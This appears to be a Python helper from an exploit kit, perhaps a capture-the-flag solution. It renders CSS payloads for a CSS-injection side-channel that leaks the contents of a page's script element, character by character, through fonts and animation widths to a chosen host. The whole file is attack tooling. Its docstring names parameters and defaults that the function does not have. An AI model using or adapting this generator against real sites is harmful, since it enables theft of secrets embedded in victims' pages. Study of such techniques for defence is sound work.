#!/usr/bin/env python3
from jinja2 import Template


def generate_css(step: int, step_map: list[int], template: Template,  alphabet_size: int, font_path: str, host: str, leak_selector: str) -> str:
    """
    Generate CSS with animation steps for characters starting from a given code point.
    
    Args:
        num_steps: Number of animation steps (indices) to leak
        idx_map: Mapping of indices to Unicode code points
        alphabet_size: Size of the alphabet (default: 100)
        font_path: Path to the font file to encode as data URL
        host: Host/prefix to use for leak URLs (default: empty string)
        leak_selector: Query selector for the element to leak (default: script:nth-of-type(4))
    Returns:
        String containing the generated CSS
    """
    if step > len(step_map):
        raise ValueError(f"Step {step} is greater than the number of steps in the step map.")

    # Simplified HTML width - just needs to fit the alphabet
    html_width = alphabet_size + 1
    
    width_containers = []
    for width in range(1, alphabet_size + 1):
        char_idx = html_width - width - 1
        width_containers.append({
            "width": width,
            "char_idx": char_idx,
            "host": host
        })

    step_char = f"\\{step_map[step]:x}"
    
    # Render template with context
    context = {
        "step": step,
        "step_char": step_char,
        "font_path": font_path,
        "width_containers": width_containers,
        "leak_selector": leak_selector,
        "host": host,
    }
    
    return template.render(**context)